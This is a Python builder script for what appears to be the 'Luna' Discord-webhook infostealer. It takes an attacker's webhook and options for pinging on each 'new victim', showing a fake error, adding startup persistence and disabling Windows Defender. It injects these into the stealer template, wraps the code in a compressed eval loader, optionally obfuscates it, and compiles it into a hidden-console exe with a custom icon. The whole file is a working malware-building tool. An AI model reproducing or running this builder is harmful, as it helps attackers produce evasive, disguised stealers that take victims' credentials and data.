import os
import random
import shutil
import subprocess
import sys
import time
from json import load
from urllib.request import urlopen
from zlib import compress

import requests
from alive_progress import alive_bar
from colorama import Fore, Style, init


class Builder:
    def __init__(self) -> None:
        self.loading()

        if not self.check():
            exit()

        self.webhook = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Enter your webhook: ')
        if not self.check_webhook(self.webhook):
            print(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} {Fore.RED}Invalid Webhook!{Fore.RESET}")
            str(input(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Press anything to exit..."))
            sys.exit()

        self.filename = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Enter your filename: ')

        self.ping = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Ping on new victim? (y/n): ')
        if self.ping.lower() == 'y':
            self.ping = True
            self.pingtype = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Ping type? (here/everyone): ').lower()
            if self.pingtype not in ["here", "everyone"]:
                # default to @here if invalid ping type.
                self.pingtype == "here"
        else:
            self.ping = False
            self.pingtype = "none"

        self.error = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Add a fake error? (y/n): ')
        if self.error.lower() == 'y':
            self.error = True
        else:
            self.error = False

        self.startup = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Add file to startup? (y/n): ')
        if self.startup.lower() == 'y':
            self.startup = True
        else:
            self.startup = False

        self.defender = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Disable windows defender? (y/n): ')
        if self.defender.lower() == 'y':
            self.defender = True
        else:
            self.defender = False

        self.obfuscation = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to obfuscate the file? (y/n): ')

        self.compy = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to compile the file to a .exe? (y/n): ')

        if self.compy == 'y':
            self.icon = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to add an icon to the .exe (y/n): ')
            if self.icon == 'y':
                self.icon_exe()
            else:
                pass
        else:
            pass

        self.mk_file(self.filename, self.webhook)

        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} File successfully created!{Fore.RESET}')

        self.cleanup(self.filename)
        self.renamefile(self.filename)

        run = input(
            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to test the file? [y/n]: ')
        if run.lower() == 'y':
            self.run(self.filename)

        input(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Press enter to exit...{Fore.RESET}')
        sys.exit()

    def loading(self):
        p = Fore.MAGENTA + Style.DIM
        r = Fore.RED + Style.BRIGHT

        img = fr"""{p}
                                                                ...                                                                    ...
                                                              ,(#(*.                                                                 ,/%#/.
                                                            ./#%%%(,                                                                 /#%%%(*
                                                           ./#%%%%%/,                                                              .*#%%%%%(,
                                                           *#%%%%%&%(,.             ..,,,*****/////////////****,,,...             ,/%%%%%%%#/.
                                                           *(%%%%%%%%%(*.  .,*/(#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#(*,..  ,/#%%%%%%%%#/.
                                                           ,/%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#%%%%%%%%%%%(*.
                                                           .*#%%%%%%%%%%&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%/,.
                                                        .*#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%/.
                                                       ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.
                                                     .*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&%%%%%%(.
                                                    .(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.
                                                   *#%%&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(.
                                                 .(#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(*
                                                ,/%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(*.
                                               ./%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.
                                              ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*
                                             ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.
                                            .(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#,
                                           ,/#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(*
                                           *%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(
                                          *(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.
                                         .(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#,
                                        .,#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}#####{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}######{p}%%%%%%%%%%%%%%%%%%%%%%%%%/.
                                        ,/#%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}###########{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}###########{p}%%%%%%%%%%%%%%%%%%%%%%%%%(,
                                        *#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}################{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}##################{p}%%%%%%%%%%%%%%%%%%%%%%%%%#/
                                        *%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}#####################{p}%%%%%%%%%%%%%%%%%%%{r}######################{p}%%%%%%%%%%%%%%%%%%%%%%%%%%(.
                                       ./%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}###################{p}%%%%%%%%%%%%%%%%%%%%%{r}####################{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%#.
                                       ,/%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}#################{p}%%%%%%%%%%%%%%%%%%%%%%%{r}##################{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%%#,.
                                       ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}#############{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}############{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.
                                       ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.
                                       ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.
                                       ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.
                                       ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&%%%%%%%%%%%%%%%%%%%%%%%#,.
                                       ./%%%%%%%%%%%%%%%%%%%%%%%%%%%%###%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%###%%%%%%%%%%%%%%%%%%%%%%%%%%%#,.
                                        *#%%%%%%%%%%%%%%%%%%%%%%%%%(*....,*(#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#(/,....,/#%%%%%%%%%%%%%%%%%%%%%%%%#/.
                                          .*/#%%%%%%%%%%%%%%%%%%%%%%%%#(*,.   .,,*//((###%%%%%%%%%%%%%%%%%%%%%%%##((//*,,.   .,*/(#%%%%%%%%%%%%%%%%%%%%%%%#(/,.
                                              .*(%%%%%%%%%%%%%%%%%%%%%%%%%%%(.              ...,,,,***,,,...              .*#%%%%%%%%%%%%%%%%%%%%%%%%%%#/,
                                                  .,/(#%%%%%%%%%%%%%%%%%%%%/,                                              ./#%%%%%%%%%%%%%%%%%%%%#/*,.
                                                       .*/(#%%%%%%%%%%%%%#/.                                                 *(%%%%%%%%%%%%%##(*,.
                                                            ..*/(#%%%%%%(,                                                    ./#&%%%%%#(*,..
                                                                  .,***,                                                        ,*/*,..


                      IP: {load(urlopen('https://api.myip.com/'))['ip']}
                Username: {os.getlogin()}
                 PC Name: {os.getenv('COMPUTERNAME')}
        Operating System: {os.getenv('OS')}
|"""

        with alive_bar(40) as bar:
            for _ in range(40):
                print(img)
                time.sleep(random.randint(1, 3) / 40)
                os.system('cls')
                bar()

            os.system('cls')

        print(Style.RESET_ALL)

    def check_webhook(self, webhook):
        try:
            with requests.get(webhook) as r:
                if r.status_code == 200:
                    return True
                else:
                    return False
        except BaseException:
            return False

    def check(self):
        required_files = {'./luna.py',
                          './requirements.txt',
                          './obfuscation.py'}

        for file in required_files:
            if not os.path.isfile(file):
                print(f'{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}] {file} not found!')
                return False

        try:
            print(
                subprocess.check_output(
                    "python -V",
                    stderr=subprocess.STDOUT))
            print(subprocess.check_output("pip -V", stderr=subprocess.STDOUT))

        except subprocess.CalledProcessError:
            print(f'{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}] Python not found!')
            return False

        os.system('pip install --upgrade -r requirements.txt')

        os.system('cls')

        os.system('mode con:cols=150 lines=20')

        return True

    def icon_exe(self):
        self.icon_name = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Enter the name of the icon: ')

        if os.path.isfile(f"./{self.icon_name}"):
            pass
        else:
            print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon not found! Please check the name and make sure it\'s in the current directory.')
            input(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Press anything to exit...")

        if self.icon_name.endswith('.ico'):
            pass
        else:
            print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon must have .ico extension! Please convert it and try again.')
            input(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Press anything to exit...")

    def renamefile(self, filename):
        try:
            os.rename(f"./obfuscated_compressed_{filename}.py", f"./{filename}.py")
        except Exception:
            pass
        try:
            os.rename(f"./compressed_{filename}.py", f"./{filename}.py")
        except Exception:
            pass
        try:
            os.rename(f"./compressed_{filename}.exe", f"./{filename}.exe")
        except Exception:
            pass
        try:
            os.rename(f"./obfuscated_compressed_{filename}.exe", f"./{filename}.exe")
        except Exception:
            pass

    def mk_file(self, filename, webhook):
        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET} {Fore.WHITE}Generating source code...{Fore.RESET}')

        with open('./luna.py', 'r', encoding="utf-8") as f:
            code = f.read()

        with open(f"{filename}.py", "w", encoding="utf-8") as f:
            f.write(code.replace('%webhook_here%', webhook)
                    .replace("\"%ping_enabled%\"", str(self.ping))
                    .replace("%ping_type%", self.pingtype)
                    .replace("\"%_error_enabled%\"", str(self.error))
                    .replace("\"%_startup_enabled%\"", str(self.startup))
                    .replace("\"%_defender_enabled%\"", str(self.defender)))

        time.sleep(2)
        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Source code has been generated...{Fore.RESET}')

        with open(f"{filename}.py", mode='rb') as f:
            content = f.read()

        print(f"{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Compressing Code...{Fore.RESET}")

        original_size = len(content)
        content = self.compress(content)
        new_size = len(content)

        with open(file='compressed_' + (filename.split('\\')[-1] if '\\' in filename else filename.split('/')[-1]) + '.py', mode='w', encoding='utf-8') as f:
            f.write(content)
            if self.obfuscation == 'n' and self.compy == 'y':
                f.write("\nimport os, platform, re, threading, uuid, requests, wmi, subprocess, sqlite3, psutil, json, base64;from tkinter import messagebox;from shutil import copy2;from zipfile import ZipFile;from Crypto.Cipher import AES;from discord import Embed, File, SyncWebhook;from PIL import ImageGrab;from win32crypt import CryptUnprotectData")

        print(f"{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Old file size: {original_size} bytes - New file size: {new_size} bytes {Fore.RESET}")

        if self.obfuscation == 'y' and self.compy == 'y':
            self.encryption(f"compressed_{filename}")
            self.compile(f"obfuscated_compressed_{filename}")
        elif self.obfuscation == 'n' and self.compy == 'y':
            self.compile(f"compressed_{filename}")
        elif self.obfuscation == 'y' and self.compy == 'n':
            self.encryption(f"compressed_{filename}")
        else:
            pass

    def compress(self, content):
        compressed_code = compress(content)
        return f"eval(compile(__import__('zlib').decompress({compressed_code}),filename='auoiwhgoawhg',mode='exec'))"

    def encryption(self, filename):
        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Obfuscating code...{Fore.RESET}')
        os.system(f"python obfuscation.py {filename}.py")

    def compile(self, filename):
        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET} {Fore.WHITE}Compiling code...{Fore.RESET}')
        if self.icon == 'y':
            icon = self.icon_name
        else:
            icon = "NONE"
        os.system(f'python -m PyInstaller --onefile --noconsole --upx-dir=./upx -i {icon} --distpath ./ .\\{filename}.py')
        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Code compiled!{Fore.RESET}')

    def run(self, filename):
        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Attempting to execute file...')

        if os.path.isfile(f'./{filename}.exe'):
            os.system(f'start ./{filename}.exe')
        elif os.path.isfile(f'./{filename}.py'):
            os.system(f'python ./{filename}.py')

    def cleanup(self, filename):
        cleans_dir = {'./__pycache__', './build'}
        cleans_file = {f'./{filename}.py', f'./obfuscated_compressed_{filename}.py', f'./compressed_{filename}.py', f'./compressed_{filename}.spec'}

        if self.obfuscation == 'y' and self.compy == 'n':
            cleans_file.remove(f'./obfuscated_compressed_{filename}.py')
        elif self.obfuscation == 'y' and self.compy == 'y':
            cleans_file.add(f'./obfuscated_compressed_{filename}.spec')
        elif self.obfuscation == 'n' and self.compy == 'n':
            cleans_file.remove(f'./{filename}.py')
        else:
            pass

        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
            except Exception:
                pass
                continue

        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
            except Exception:
                pass
                continue


if __name__ == '__main__':
    init()

    if os.name != "nt":
        os.system("clear")
    else:
        os.system('mode con:cols=212 lines=212')
        os.system("cls")

    Builder()
